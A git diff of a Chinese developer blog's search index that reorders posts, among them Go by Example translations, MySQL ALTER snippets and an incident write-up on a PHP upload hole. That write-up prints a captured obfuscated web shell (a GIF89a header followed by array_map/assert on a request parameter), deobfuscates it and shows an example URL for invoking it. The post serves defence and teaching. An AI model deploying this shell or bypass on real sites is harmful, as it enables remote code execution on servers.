+<h2 id="Go-by-Example-Timeouts"><a href="#Go-by-Example-Timeouts" class="headerlink" title="Go by Example: Timeouts"></a><center>Go by Example: Timeouts</center></h2><p>超时对于需要联接外部资源或需要限定执行时间的程序非常重要，在golang中因为存在<code>channel</code>和<code>select</code>使得超时实现起来非常简单。</p>
+<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 通过管道c1模拟一个2s后才有返回值的外部请求</span></span><br><span class="line">    c1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        time.Sleep(time.Second * <span class="number">2</span>)</span><br><span class="line">        c1 &lt;- <span class="string">&quot;result 1&quot;</span></span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用select执行一条超时操作</span></span><br><span class="line">    <span class="comment">// res等待管道c1的值，&lt;-time.After(time.Second * 1)等待一个一秒后发送的值。</span></span><br><span class="line">    <span class="comment">// 由于select会执行第一个就绪的条件，所以如果前者执行时间超过后者代码中规定的一秒便会进入后者超时的情况</span></span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> res := &lt;-c1:</span><br><span class="line">            fmt.Println(res)</span><br><span class="line">        <span class="keyword">case</span> &lt;-time.After(time.Second * <span class="number">1</span>):</span><br><span class="line">            fmt.Println(<span class="string">&quot;timeout1&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 由于res会在两秒后就绪，小于超时的三秒限制，所以不会超时</span></span><br><span class="line">    c2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        time.Sleep(time.Second * <span class="number">2</span>)</span><br><span class="line">        c2 &lt;- <span class="string">&quot;result 2&quot;</span></span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> res := &lt;-c2:</span><br><span class="line">            fmt.Println(res)</span><br><span class="line">        <span class="keyword">case</span> &lt;-time.After(time.Second * <span class="number">3</span>):</span><br><span class="line">            fmt.Println(<span class="string">&quot;timeout 2&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tashuo:golang ta_shuo$ go run timeout.go</span><br><span class="line">timeout1</span><br><span class="line">result 2</span><br></pre></td></tr></table></figure>
+
+<p>使用select结构的超时模式需要借助管道进行通信，这通常是个好主意因为其他一些golang重要的功能也是基于管道和select。</p>
+<p>原文链接：<a href="https://gobyexample.com/timeouts">Go by Example: Timeouts</a></p>
 ]]></content>
       <categories>
         <category>golang</category>
@@ -1060,28 +1076,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Go by Example - Variadic Functions</title>
-    <url>/2017/07/18/go-by-example-variadic-function/</url>
-    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
-<blockquote>
-<p>Go by Example</p>
-<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
-<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
-</blockquote>
-<h2 id="Go-by-Example-Variadic-Functions"><a href="#Go-by-Example-Variadic-Functions" class="headerlink" title="Go by Example: Variadic Functions"></a><center>Go by Example: Variadic Functions</center></h2><p>可以使用任意数量的参数来调用可变参数函数，如<code>fmt.Println</code>就是一个常用的可变参数函数。</p>
-<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数，可以接受任意数量的int值作为参数。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(nums ...<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    fmt.Print(nums, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    total := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _, num := <span class="keyword">range</span> nums &#123;</span><br><span class="line">        total += num</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(total)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 使用独立的参数调用。</span></span><br><span class="line">    sum(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">    sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用相应类型的slice调用可变参数函数。func(slice...)。</span></span><br><span class="line">    nums := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">    sum(nums...)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run variadic-functions.go </span><br><span class="line">[1 2] 3</span><br><span class="line">[1 2 3] 6</span><br><span class="line">[1 2 3 4] 10</span><br></pre></td></tr></table></figure>
-
-
-<p>原文链接：<a href="https://gobyexample.com/variadic-functions">Go by Example: Variadic Functions</a></p>
-]]></content>
-      <categories>
-        <category>golang</category>
-        <category>笔记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Go by Example - Worker Pools</title>
     <url>/2017/11/24/go-by-example-worker-pool/</url>
     <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
@@ -1097,6 +1091,28 @@
 
 <p>通过输出可以看出5个任务被多个工作进程执行。程序只消耗了2秒多而不是5秒，是因为所有的任务被3个工作进程并发处理。</p>
 <p>原文链接：<a href="https://gobyexample.com/worker-pools">Go by Example: Worker Pools</a></p>
+]]></content>
+      <categories>
+        <category>golang</category>
+        <category>笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Go by Example - Variadic Functions</title>
+    <url>/2017/07/18/go-by-example-variadic-function/</url>
+    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
+<blockquote>
+<p>Go by Example</p>
+<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
+<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
+</blockquote>
+<h2 id="Go-by-Example-Variadic-Functions"><a href="#Go-by-Example-Variadic-Functions" class="headerlink" title="Go by Example: Variadic Functions"></a><center>Go by Example: Variadic Functions</center></h2><p>可以使用任意数量的参数来调用可变参数函数，如<code>fmt.Println</code>就是一个常用的可变参数函数。</p>
+<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数，可以接受任意数量的int值作为参数。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(nums ...<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    fmt.Print(nums, <span class="string">&quot; &quot;</span>)</span><br><span class="line">    total := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _, num := <span class="keyword">range</span> nums &#123;</span><br><span class="line">        total += num</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(total)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 使用独立的参数调用。</span></span><br><span class="line">    sum(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">    sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用相应类型的slice调用可变参数函数。func(slice...)。</span></span><br><span class="line">    nums := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">    sum(nums...)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run variadic-functions.go </span><br><span class="line">[1 2] 3</span><br><span class="line">[1 2 3] 6</span><br><span class="line">[1 2 3 4] 10</span><br></pre></td></tr></table></figure>
+
+
+<p>原文链接：<a href="https://gobyexample.com/variadic-functions">Go by Example: Variadic Functions</a></p>
 ]]></content>
       <categories>
         <category>golang</category>
@@ -1135,28 +1151,6 @@
       </categories>
       <tags>
         <tag>连接池</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MySQL常用表结构调整语句</title>
-    <url>/2016/12/19/mysql-alter-sqls/</url>
-    <content><![CDATA[<ul>
-<li><p>  修改表的引擎<br><code>mysql&gt; ALTER TABLE $table_name ENGINE = InnodB;</code></p>
-</li>
-<li><p>  修改表名<br><code>mysql&gt; RENAME TABLE $old_table_name TO $new_table_name</code></p>
-</li>
-<li><p>  增加主键/索引<br><code>mysql&gt; ALTER TABLE $tableName ADD (PRIMARY) KEY ($column)</code></p>
-</li>
-<li><p>  待续…</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>mysql</category>
-      </categories>
-      <tags>
-        <tag>mysql</tag>
       </tags>
   </entry>
   <entry>
@@ -1265,6 +1259,28 @@
       <tags>
         <tag>跨域</tag>
         <tag>CORS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MySQL常用表结构调整语句</title>
+    <url>/2016/12/19/mysql-alter-sqls/</url>
+    <content><![CDATA[<ul>
+<li><p>  修改表的引擎<br><code>mysql&gt; ALTER TABLE $table_name ENGINE = InnodB;</code></p>
+</li>
+<li><p>  修改表名<br><code>mysql&gt; RENAME TABLE $old_table_name TO $new_table_name</code></p>
+</li>
+<li><p>  增加主键/索引<br><code>mysql&gt; ALTER TABLE $tableName ADD (PRIMARY) KEY ($column)</code></p>
+</li>
+<li><p>  待续…</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>mysql</category>
+      </categories>
+      <tags>
+        <tag>mysql</tag>
       </tags>
   </entry>
   <entry>
@@ -1839,60 +1855,6 @@
       </categories>
   </entry>
   <entry>
-    <title>一次PHP图片上传验证不严谨引发的血案</title>
-    <url>/2017/07/05/php-upload-image-security/</url>
-    <content><![CDATA[<p>之前做过一个项目涉及到用户上传图片，当时项目比较小且一个人做就没用框架。上传这部分的验证综合服务器没有安装<code>exif</code>、<code>gd</code>扩展就简单根据 <strong><code>getimagesize</code></strong>(<a href="http://php.net/manual/zh/function.getimagesize.php">文档</a>) 函数是否返回false判断，后面出现了问题。</p>
-<p>有天一位前同事告知这个项目被朋友hack注入了脚本，就是通过上传操作。</p>
-<p>我登入服务器相应目录，根据时间排序发现了可疑文件，后缀名竟然是 <code>.php</code>，矮油我去，赶紧download下来并删除(线上先暂时加了后缀名验证)，打开一看:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="variable">$bSzrL</span>= <span class="string">&quot;s\x74r\x5fr\x65\x70lac\x65&quot;</span>;</span><br><span class="line">    @<span class="variable">$VwissV</span>= @<span class="variable">$bSzrL</span>(<span class="string">&#x27;drApO&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;adrApOrdrApOraydrApO_drApOmdrApOap&#x27;</span>);</span><br><span class="line">    @<span class="variable">$ZXNFh</span>= @<span class="variable">$bSzrL</span>(<span class="string">&#x27;DBCFzQ&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;asseDBCFzQrDBCFzQt&#x27;</span>);</span><br><span class="line">    @<span class="variable">$VwissV</span>(@<span class="variable">$ZXNFh</span>,(<span class="keyword">array</span>)@<span class="variable">$_REQUEST</span>[<span class="string">&#x27;csqing123&#x27;</span>]);</span><br></pre></td></tr></table></figure>
-
-<p>毕竟学识浅薄，没搞过别人也没别人搞过，不太熟悉其中的套路，傻眼了两秒。</p>
-<span id="more"></span>
-<p>先不管文件中的那些不规则字符变量，问题应该是出在文件开头的 <code>GIF89a</code>。本地测试直接使用<code>getimagesize</code>函数，<code>var_dump</code>出来:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  int(3360)</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  int(15370)</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  int(1)</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(27) &quot;width=&quot;3360&quot; height=&quot;15370&quot;&quot;</span><br><span class="line">  [&quot;channels&quot;]=&gt;</span><br><span class="line">  int(3)</span><br><span class="line">  [&quot;mime&quot;]=&gt;</span><br><span class="line">  string(9) &quot;image/gif&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这尼玛<code>getimagesize</code>表示也很无奈，然后使用<code>exif_imagetype</code>处理打印出来是1，即常量<code>IMAGETYPE_GIF</code>的值，看来<code>exif</code>扩展也沦陷了。不慌，接着试<code>finfo_open</code>，欣慰的是伴随着一串串的 notice 和 warning, 脚本返回了<code>false</code>，完美。</p>
-<p>原因暂时找到了，接着就是探究文件头的罪魁祸首 <code>GIF89a</code>。查到百科:<br><a href="https://en.wikipedia.org/wiki/Magic_number_(programming)">Magic number</a></p>
-<blockquote>
-<p>Compiled Java class files (bytecode) and Mach-O binaries start with hex CAFEBABE. When compressed with Pack200 the bytes are changed to CAFED00D.</p>
-<p>GIF image files have the ASCII code for “GIF89a” (47 49 46 38 39 61) or “GIF87a” (47 49 46 38 37 61)</p>
-<p>JPEG image files begin with FF D8 and end with FF D9. JPEG/JFIF files contain the ASCII code for “JFIF” (4A 46 49 46) as a null terminated string. JPEG/Exif files contain the ASCII code for “Exif” (45 78 69 66) also as a null terminated string, followed by more metadata about the file.</p>
-<p>PNG image files begin with an 8-byte signature which identifies the file as a PNG file and allows detection of common file transfer problems: \211 P N G \r \n \032 \n (89 50 4E 47 0D 0A 1A 0A). That signature contains various newline characters to permit detecting unwarranted automated newline conversions, such as transferring the file using FTP with the ASCII transfer mode instead of the binary mode.[5]</p>
-</blockquote>
-<p>大致意思是某些特定的文件含有特定的某些字符，而GIF文件的特殊字符是<code>GIF89a</code>,<code>GIF87a</code>。由此可推算<code>getimagesize</code>和<code>exif_imagetype</code>可能就是被文件头部的特殊字符误导判断为GIF文件。*(我试了下把文件头的6个字符删得只剩GIF3个字符后依然存在问题 todo)*</p>
-<p>如果要继续探究这两个有问题的函数的话，得去读源码，大致可以猜到有匹配文件头的N个字符去判断有关。</p>
-<p>没完，继续。</p>
-<p><code>GIF89a</code>后面那些几乎没有可读性的PHP代码究竟是什么？</p>
-<p>简单把变量打印出来便知：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="variable">$bSzrL</span>= <span class="string">&quot;s\x74r\x5fr\x65\x70lac\x65&quot;</span>;</span><br><span class="line">    @<span class="variable">$VwissV</span>= @<span class="variable">$bSzrL</span>(<span class="string">&#x27;drApO&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;adrApOrdrApOraydrApO_drApOmdrApOap&#x27;</span>);</span><br><span class="line">    @<span class="variable">$ZXNFh</span>= @<span class="variable">$bSzrL</span>(<span class="string">&#x27;DBCFzQ&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;asseDBCFzQrDBCFzQt&#x27;</span>);</span><br><span class="line">    @<span class="variable">$VwissV</span>(@<span class="variable">$ZXNFh</span>,(<span class="keyword">array</span>)@<span class="variable">$_REQUEST</span>[<span class="string">&#x27;csqing123&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$bSzrL</span>, <span class="variable">$VwissV</span>, <span class="variable">$ZXNFh</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印结果</span></span><br><span class="line">    <span class="comment">// string(11) &quot;str_replace&quot;</span></span><br><span class="line">    <span class="comment">// string(9) &quot;array_map&quot;</span></span><br><span class="line">    <span class="comment">// string(6) &quot;assert&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>原来<code>\x74</code>,<code>\x5f</code>这些鬼字符串是<strong>十六进制</strong>，双引号下自动解析为相应的字符，查进制表就看到 <code>\x74</code> -&gt; <code>t</code>, <code>\x5f</code> -&gt; <code>_</code>, 其他同理。</p>
-<p>最后经过处理，主要逻辑就一句话：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">array_map</span>(`assert`, (<span class="keyword">array</span>)<span class="variable">$_REQUEST</span>[<span class="string">&#x27;csqing123&#x27;</span>]);</span><br></pre></td></tr></table></figure>
-
-<p>即黑客可<strong>通过开头上传的脚本文件通过<code>assert</code>函数执行任何PHP语句</strong>，如：<a href="http://www.myproject.com/uploads/hacker.php?csqing123=exit">http://www.myproject.com/uploads/hacker.php?csqing123=exit</a>(‘u r hacked’)。</p>
-<p>可怕吧。</p>
-<p>说回正事，上传的图片究竟该如何验证？GIF有此问题，保不准其他类型的图片文件也存在。首先先排除掉 <code>getimagesize</code>,<code>exif_imagetype</code> 这两个函数，蛋疼的是我在 stackoverflow 上看到相关问题顶在最上面的回答很多都是用这俩。当然前面测试通过的<code>finfo</code>扩展可以，也看到有鬼佬建议用户所有上传的图片都通过<code>gd</code>库验证并转化为统一的比如<code>png</code>格式的图片，虽然比较耗CPU资源，但一方面文件类型统一方便处理，另一方面绝对保证了图片文件类型的安全性，也不失为一个方向吧。</p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>不可单纯依赖<code>getimagesize</code>,<code>exif_imagetype</code>这两个函数判断文件是否为图片(至少GIF图片)</p>
-<p><br/><br/><br/></p>
-<p>参考资料：</p>
-<blockquote>
-<p><a href="https://en.wikipedia.org/wiki/Magic_number_(programming)">Magic_number, 魔术数字</a></p>
-<p><a href="https://www.ibm.com/support/knowledgecenter/zh/ssw_aix_61/com.ibm.aix.networkcomm/conversion_table.htm">ASCII，十进制，十六进制，八进制和二进制转换表</a></p>
-<p><a href="https://stackoverflow.com/questions/9314164/php-uploading-files-image-only-checking">PHP Uploading files - image only checking</a></p>
-<p><a href="https://stackoverflow.com/questions/2486329/how-can-i-only-allow-certain-filetypes-on-upload-in-php">How can I only allow certain filetypes on upload in php?</a></p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>PHP</category>
-        <category>笔记</category>
-      </categories>
-      <tags>
-        <tag>upload</tag>
-        <tag>security</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>OAuth授权与CSRF攻击</title>
     <url>/2017/02/09/oauth2-csrf/</url>
     <content><![CDATA[<h2 id="OAuth简介"><a href="#OAuth简介" class="headerlink" title="OAuth简介"></a>OAuth简介</h2><blockquote>
@@ -2038,6 +2000,60 @@ Pragma: no-cache
       </tags>
   </entry>
   <entry>
+    <title>一次PHP图片上传验证不严谨引发的血案</title>
+    <url>/2017/07/05/php-upload-image-security/</url>
+    <content><![CDATA[<p>之前做过一个项目涉及到用户上传图片，当时项目比较小且一个人做就没用框架。上传这部分的验证综合服务器没有安装<code>exif</code>、<code>gd</code>扩展就简单根据 <strong><code>getimagesize</code></strong>(<a href="http://php.net/manual/zh/function.getimagesize.php">文档</a>) 函数是否返回false判断，后面出现了问题。</p>
+<p>有天一位前同事告知这个项目被朋友hack注入了脚本，就是通过上传操作。</p>
+<p>我登入服务器相应目录，根据时间排序发现了可疑文件，后缀名竟然是 <code>.php</code>，矮油我去，赶紧download下来并删除(线上先暂时加了后缀名验证)，打开一看:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="variable">$bSzrL</span>= <span class="string">&quot;s\x74r\x5fr\x65\x70lac\x65&quot;</span>;</span><br><span class="line">    @<span class="variable">$VwissV</span>= @<span class="variable">$bSzrL</span>(<span class="string">&#x27;drApO&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;adrApOrdrApOraydrApO_drApOmdrApOap&#x27;</span>);</span><br><span class="line">    @<span class="variable">$ZXNFh</span>= @<span class="variable">$bSzrL</span>(<span class="string">&#x27;DBCFzQ&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;asseDBCFzQrDBCFzQt&#x27;</span>);</span><br><span class="line">    @<span class="variable">$VwissV</span>(@<span class="variable">$ZXNFh</span>,(<span class="keyword">array</span>)@<span class="variable">$_REQUEST</span>[<span class="string">&#x27;csqing123&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>毕竟学识浅薄，没搞过别人也没别人搞过，不太熟悉其中的套路，傻眼了两秒。</p>
+<span id="more"></span>
+<p>先不管文件中的那些不规则字符变量，问题应该是出在文件开头的 <code>GIF89a</code>。本地测试直接使用<code>getimagesize</code>函数，<code>var_dump</code>出来:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  int(3360)</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  int(15370)</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  int(1)</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(27) &quot;width=&quot;3360&quot; height=&quot;15370&quot;&quot;</span><br><span class="line">  [&quot;channels&quot;]=&gt;</span><br><span class="line">  int(3)</span><br><span class="line">  [&quot;mime&quot;]=&gt;</span><br><span class="line">  string(9) &quot;image/gif&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这尼玛<code>getimagesize</code>表示也很无奈，然后使用<code>exif_imagetype</code>处理打印出来是1，即常量<code>IMAGETYPE_GIF</code>的值，看来<code>exif</code>扩展也沦陷了。不慌，接着试<code>finfo_open</code>，欣慰的是伴随着一串串的 notice 和 warning, 脚本返回了<code>false</code>，完美。</p>
+<p>原因暂时找到了，接着就是探究文件头的罪魁祸首 <code>GIF89a</code>。查到百科:<br><a href="https://en.wikipedia.org/wiki/Magic_number_(programming)">Magic number</a></p>
+<blockquote>
+<p>Compiled Java class files (bytecode) and Mach-O binaries start with hex CAFEBABE. When compressed with Pack200 the bytes are changed to CAFED00D.</p>
+<p>GIF image files have the ASCII code for “GIF89a” (47 49 46 38 39 61) or “GIF87a” (47 49 46 38 37 61)</p>
+<p>JPEG image files begin with FF D8 and end with FF D9. JPEG/JFIF files contain the ASCII code for “JFIF” (4A 46 49 46) as a null terminated string. JPEG/Exif files contain the ASCII code for “Exif” (45 78 69 66) also as a null terminated string, followed by more metadata about the file.</p>
+<p>PNG image files begin with an 8-byte signature which identifies the file as a PNG file and allows detection of common file transfer problems: \211 P N G \r \n \032 \n (89 50 4E 47 0D 0A 1A 0A). That signature contains various newline characters to permit detecting unwarranted automated newline conversions, such as transferring the file using FTP with the ASCII transfer mode instead of the binary mode.[5]</p>
+</blockquote>
+<p>大致意思是某些特定的文件含有特定的某些字符，而GIF文件的特殊字符是<code>GIF89a</code>,<code>GIF87a</code>。由此可推算<code>getimagesize</code>和<code>exif_imagetype</code>可能就是被文件头部的特殊字符误导判断为GIF文件。*(我试了下把文件头的6个字符删得只剩GIF3个字符后依然存在问题 todo)*</p>
+<p>如果要继续探究这两个有问题的函数的话，得去读源码，大致可以猜到有匹配文件头的N个字符去判断有关。</p>
+<p>没完，继续。</p>
+<p><code>GIF89a</code>后面那些几乎没有可读性的PHP代码究竟是什么？</p>
+<p>简单把变量打印出来便知：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="variable">$bSzrL</span>= <span class="string">&quot;s\x74r\x5fr\x65\x70lac\x65&quot;</span>;</span><br><span class="line">    @<span class="variable">$VwissV</span>= @<span class="variable">$bSzrL</span>(<span class="string">&#x27;drApO&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;adrApOrdrApOraydrApO_drApOmdrApOap&#x27;</span>);</span><br><span class="line">    @<span class="variable">$ZXNFh</span>= @<span class="variable">$bSzrL</span>(<span class="string">&#x27;DBCFzQ&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;asseDBCFzQrDBCFzQt&#x27;</span>);</span><br><span class="line">    @<span class="variable">$VwissV</span>(@<span class="variable">$ZXNFh</span>,(<span class="keyword">array</span>)@<span class="variable">$_REQUEST</span>[<span class="string">&#x27;csqing123&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$bSzrL</span>, <span class="variable">$VwissV</span>, <span class="variable">$ZXNFh</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印结果</span></span><br><span class="line">    <span class="comment">// string(11) &quot;str_replace&quot;</span></span><br><span class="line">    <span class="comment">// string(9) &quot;array_map&quot;</span></span><br><span class="line">    <span class="comment">// string(6) &quot;assert&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>原来<code>\x74</code>,<code>\x5f</code>这些鬼字符串是<strong>十六进制</strong>，双引号下自动解析为相应的字符，查进制表就看到 <code>\x74</code> -&gt; <code>t</code>, <code>\x5f</code> -&gt; <code>_</code>, 其他同理。</p>
+<p>最后经过处理，主要逻辑就一句话：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">array_map</span>(`assert`, (<span class="keyword">array</span>)<span class="variable">$_REQUEST</span>[<span class="string">&#x27;csqing123&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>即黑客可<strong>通过开头上传的脚本文件通过<code>assert</code>函数执行任何PHP语句</strong>，如：<a href="http://www.myproject.com/uploads/hacker.php?csqing123=exit">http://www.myproject.com/uploads/hacker.php?csqing123=exit</a>(‘u r hacked’)。</p>
+<p>可怕吧。</p>
+<p>说回正事，上传的图片究竟该如何验证？GIF有此问题，保不准其他类型的图片文件也存在。首先先排除掉 <code>getimagesize</code>,<code>exif_imagetype</code> 这两个函数，蛋疼的是我在 stackoverflow 上看到相关问题顶在最上面的回答很多都是用这俩。当然前面测试通过的<code>finfo</code>扩展可以，也看到有鬼佬建议用户所有上传的图片都通过<code>gd</code>库验证并转化为统一的比如<code>png</code>格式的图片，虽然比较耗CPU资源，但一方面文件类型统一方便处理，另一方面绝对保证了图片文件类型的安全性，也不失为一个方向吧。</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>不可单纯依赖<code>getimagesize</code>,<code>exif_imagetype</code>这两个函数判断文件是否为图片(至少GIF图片)</p>
+<p><br/><br/><br/></p>
+<p>参考资料：</p>
+<blockquote>
+<p><a href="https://en.wikipedia.org/wiki/Magic_number_(programming)">Magic_number, 魔术数字</a></p>
+<p><a href="https://www.ibm.com/support/knowledgecenter/zh/ssw_aix_61/com.ibm.aix.networkcomm/conversion_table.htm">ASCII，十进制，十六进制，八进制和二进制转换表</a></p>
+<p><a href="https://stackoverflow.com/questions/9314164/php-uploading-files-image-only-checking">PHP Uploading files - image only checking</a></p>
+<p><a href="https://stackoverflow.com/questions/2486329/how-can-i-only-allow-certain-filetypes-on-upload-in-php">How can I only allow certain filetypes on upload in php?</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>PHP</category>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>upload</tag>
+        <tag>security</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>session的开启与关闭</title>
     <url>/2017/02/08/session-start-and-destroy/</url>
     <content><![CDATA[<h3 id="session-start"><a href="#session-start" class="headerlink" title="session start"></a>session start</h3><p>手工开启之前需先判断是否已经启动, 两种判断:</p>
@@ -2169,32 +2185,6 @@ Pragma: no-cache
       </tags>
   </entry>
   <entry>
-    <title>许知远：庸众的胜利</title>
-    <url>/2017/01/17/the-victory-of-mediocre-persons/</url>
-    <content><![CDATA[<blockquote>
-<p>文: 许知远<br>来源: 凤凰网<br>链接: <a href="http://book.ifeng.com/culture/1/detail_2010_05/11/1504069_0.shtml">http://book.ifeng.com/culture/1/detail_2010_05/11/1504069_0.shtml</a> </p>
-</blockquote>
-<p>大约三十年前，当法国学生们被问道，谁是他们最仰慕的公众人物时，他们选择的不是老年萨特，而是米歇尔.科卢奇——一位电视喜剧演员，以嘲讽和出言不逊著称。</p>
-<p>时代的风尚转变了，六十年代的理想主义、改变世界的愿望，让位于七十年代的幻灭与狭隘的个人主义。嘲讽成了时代的情绪，人们在乎的是姿态，而不是内容。</p>
